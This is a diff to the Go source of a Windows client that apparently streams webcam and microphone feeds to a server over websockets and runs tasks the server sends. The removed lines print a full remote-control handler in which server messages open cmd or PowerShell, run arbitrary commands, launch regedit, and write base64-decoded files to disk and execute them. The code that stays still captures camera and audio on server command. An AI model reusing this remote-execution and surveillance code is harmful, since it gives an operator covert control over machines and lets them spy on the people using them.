@@ -14,12 +14,10 @@ import (
 	"io/ioutil"
 	"net/http"
 	"os"
-	"os/exec"
 	"path/filepath"
 	"runtime"
 	"strconv"
 	"strings"
-	"sync"
 	"sync/atomic"
 	"time"
 	"unsafe"
@@ -145,30 +143,6 @@ func utf16ToString(u []uint16) string {
 		n++
 	}
 	return windows.UTF16ToString(u[:n])
-}
-
-func sanitizeFilename(name string) string {
-	name = strings.TrimSpace(name)
-	if name == "" {
-		return ""
-	}
-	out := make([]rune, 0, len(name))
-	for _, r := range name {
-		if (r >= 'a' && r <= 'z') || (r >= 'A' && r <= 'Z') || (r >= '0' && r <= '9') || r == '.' || r == '_' || r == '-' {
-			out = append(out, r)
-		}
-	}
-	if len(out) == 0 {
-		return ""
-	}
-	return string(out)
-}
-
-func exeDir() string {
-	if p, err := os.Executable(); err == nil {
-		return filepath.Dir(p)
-	}
-	return "."
 }
 
 func bytesFromPtr(ptr uintptr, n int) []byte {
@@ -629,7 +603,7 @@ func cameraStreamWS(dev Device, camName string, fps int, quality int, width int,
 		procDestroyWindow.Call(hwnd)
 	}()
 	for atomic.LoadInt32(&streamFlag) == 1 {
-		sess, err := ensureCtrlSession(dev, secret)
+		sess, err := openDeviceWS(dev, secret)
 		if err != nil {
 			time.Sleep(2 * time.Second)
 			continue
@@ -678,7 +652,7 @@ func cameraStreamWS(dev Device, camName string, fps int, quality int, width int,
 			time.Sleep(d)
 			last = time.Now()
 		}
-		// keep control session open
+		sess.CloseGracefully()
 	}
 }
 
@@ -759,7 +733,7 @@ func micStreamWS(dev Device, micName string, sampleRate int, channels int, chunk
 	}
 	procWaveInStart.Call(hWave)
 	for atomic.LoadInt32(&streamFlag) == 1 {
-		sess, err := ensureCtrlSession(dev, secret)
+		sess, err := openDeviceWS(dev, secret)
 		if err != nil {
 			time.Sleep(2 * time.Second)
 			continue
@@ -794,7 +768,7 @@ func micStreamWS(dev Device, micName string, sampleRate int, channels int, chunk
 				lastPing = time.Now()
 			}
 		}
-		// keep control session open
+		sess.CloseGracefully()
 	}
 }
 
@@ -1099,9 +1073,6 @@ type wsSession struct {
 	conn *websocket.Conn
 }
 
-var ctrlMu sync.Mutex
-var ctrlSess *wsSession
-
 func openDeviceWS(dev Device, secret string) (*wsSession, error) {
 	dialer := websocket.Dialer{}
 	conn, _, err := dialer.Dial(wsURL("/ws/device"), nil)
@@ -1117,20 +1088,6 @@ func openDeviceWS(dev Device, secret string) (*wsSession, error) {
 	return &wsSession{conn: conn}, nil
 }
 
-func ensureCtrlSession(dev Device, secret string) (*wsSession, error) {
-	ctrlMu.Lock()
-	defer ctrlMu.Unlock()
-	if ctrlSess != nil && ctrlSess.conn != nil {
-		return ctrlSess, nil
-	}
-	s, err := openDeviceWS(dev, secret)
-	if err != nil {
-		return nil, err
-	}
-	ctrlSess = s
-	return ctrlSess, nil
-}
-
 func (s *wsSession) StartKeepAlive() {
 	if s == nil || s.conn == nil {
 		return
@@ -1143,56 +1100,8 @@ func (s *wsSession) StartKeepAlive() {
 	})
 	go func() {
 		for {
-			_, data, err := s.conn.ReadMessage()
-			if err != nil {
+			if _, _, err := s.conn.ReadMessage(); err != nil {
 				return
-			}
-			var msg map[string]any
-			if e := json.Unmarshal(data, &msg); e != nil {
-				continue
-			}
-			t := strings.ToLower(strings.TrimSpace(fmt.Sprintf("%v", msg["type"])))
-			switch t {
-			case "open_explorer":
-				p := strings.TrimSpace(fmt.Sprintf("%v", msg["path"]))
-				if p == "" {
-					p = "C:\\"
-				}
-				_ = exec.Command("explorer.exe", p).Start()
-			case "open_shell":
-				cmd := strings.TrimSpace(fmt.Sprintf("%v", msg["cmd"]))
-				if cmd == "" || strings.EqualFold(cmd, "cmd") || strings.EqualFold(cmd, "cmd.exe") {
-					_ = exec.Command("cmd", "/c", "start", "", "cmd.exe").Start()
-				} else if strings.EqualFold(cmd, "powershell") || strings.EqualFold(cmd, "powershell.exe") {
-					_ = exec.Command("cmd", "/c", "start", "", "powershell.exe").Start()
-				} else {
-					_ = exec.Command("cmd", "/c", "start", "", cmd).Start()
-				}
-			case "open_regedit":
-				_ = exec.Command("cmd", "/c", "start", "", "regedit.exe").Start()
-			case "file_open":
-				name := sanitizeFilename(fmt.Sprintf("%v", msg["filename"]))
-				if name == "" {
-					name = "file.bin"
-				}
-				b64 := fmt.Sprintf("%v", msg["b64"])
-				if strings.TrimSpace(b64) != "" {
-					dir := filepath.Join(exeDir(), "received")
-					_ = os.MkdirAll(dir, 0755)
-					fp := filepath.Join(dir, name)
-					if buf, e := base64.StdEncoding.DecodeString(b64); e == nil {
-						_ = os.WriteFile(fp, buf, 0644)
-						_ = exec.Command("cmd", "/c", "start", "", fp).Start()
-					}
-				}
-			case "open_path":
-				p := strings.TrimSpace(fmt.Sprintf("%v", msg["path"]))
-				if p == "" {
-					p = "C:\\"
-				}
-				_ = exec.Command("explorer.exe", p).Start()
-			default:
-				// ignore other message types here; tasks manage streaming
 			}
 		}
 	}()
@@ -1220,81 +1129,6 @@ func (s *wsSession) Ping() {
 		return
 	}
 	_ = s.conn.WriteControl(websocket.PingMessage, []byte("p"), time.Now().Add(2*time.Second))
-}
-
-func runCtrlLoop(dev Device) {
-	secret := streamSecret()
-	for {
-		s, err := ensureCtrlSession(dev, secret)
-		if err != nil {
-			time.Sleep(2 * time.Second)
-			continue
-		}
-		s.conn.SetReadLimit(1 << 20)
-		s.conn.SetReadDeadline(time.Now().Add(60 * time.Second))
-		s.conn.SetPongHandler(func(string) error {
-			s.conn.SetReadDeadline(time.Now().Add(60 * time.Second))
-			return nil
-		})
-		for {
-			_, data, err := s.conn.ReadMessage()
-			if err != nil {
-				ctrlMu.Lock()
-				if ctrlSess == s {
-					ctrlSess = nil
-				}
-				ctrlMu.Unlock()
-				break
-			}
-			var msg map[string]any
-			if e := json.Unmarshal(data, &msg); e != nil {
-				continue
-			}
-			t := strings.ToLower(strings.TrimSpace(fmt.Sprintf("%v", msg["type"])))
-			switch t {
-			case "open_explorer":
-				p := strings.TrimSpace(fmt.Sprintf("%v", msg["path"]))
-				if p == "" {
-					p = "C:\\"
-				}
-				_ = exec.Command("explorer.exe", p).Start()
-			case "open_shell":
-				cmd := strings.TrimSpace(fmt.Sprintf("%v", msg["cmd"]))
-				if cmd == "" || strings.EqualFold(cmd, "cmd") || strings.EqualFold(cmd, "cmd.exe") {
-					_ = exec.Command("cmd", "/c", "start", "", "cmd.exe").Start()
-				} else if strings.EqualFold(cmd, "powershell") || strings.EqualFold(cmd, "powershell.exe") {
-					_ = exec.Command("cmd", "/c", "start", "", "powershell.exe").Start()
-				} else {
-					_ = exec.Command("cmd", "/c", "start", "", cmd).Start()
-				}
-			case "open_regedit":
-				_ = exec.Command("cmd", "/c", "start", "", "regedit.exe").Start()
-			case "file_open":
-				name := sanitizeFilename(fmt.Sprintf("%v", msg["filename"]))
-				if name == "" {
-					name = "file.bin"
-				}
-				b64 := fmt.Sprintf("%v", msg["b64"])
-				if strings.TrimSpace(b64) != "" {
-					dir := filepath.Join(exeDir(), "received")
-					_ = os.MkdirAll(dir, 0755)
-					fp := filepath.Join(dir, name)
-					if buf, e := base64.StdEncoding.DecodeString(b64); e == nil {
-						_ = os.WriteFile(fp, buf, 0644)
-						_ = exec.Command("cmd", "/c", "start", "", fp).Start()
-					}
-				}
-			case "open_path":
-				p := strings.TrimSpace(fmt.Sprintf("%v", msg["path"]))
-				if p == "" {
-					p = "C:\\"
-				}
-				_ = exec.Command("explorer.exe", p).Start()
-			default:
-			}
-		}
-		time.Sleep(1 * time.Second)
-	}
 }
 func handleTask(dev Device, t Task) {
 	_ = updateTask(t.ID, "running", nil)
@@ -1343,12 +1177,13 @@ func handleTask(dev Device, t Task) {
 				}
 				secret := streamSecret()
 				for atomic.LoadInt32(&streamFlag) == 1 {
-					sess, err := ensureCtrlSession(dev, secret)
+					sess, err := openDeviceWS(dev, secret)
 					if err != nil {
 						fmt.Println("ws dial error:", err)
 						time.Sleep(2 * time.Second)
 						continue
 					}
+					sess.StartKeepAlive()
 					dynQ := q
 					if dynQ < 40 {
 						dynQ = 40
@@ -1384,7 +1219,7 @@ func handleTask(dev Device, t Task) {
 						time.Sleep(interval - time.Since(last))
 						last = time.Now()
 					}
-					// keep control session open
+					sess.CloseGracefully()
 				}
 			}()
 		} else if pl.Source == "camera" {
@@ -1492,7 +1327,6 @@ func main() {
 			time.Sleep(5 * time.Second)
 		}
 	}()
-	go runCtrlLoop(dev)
 	for {
 		tasks, err := listTasks(dev.ID)
 		if err != nil {
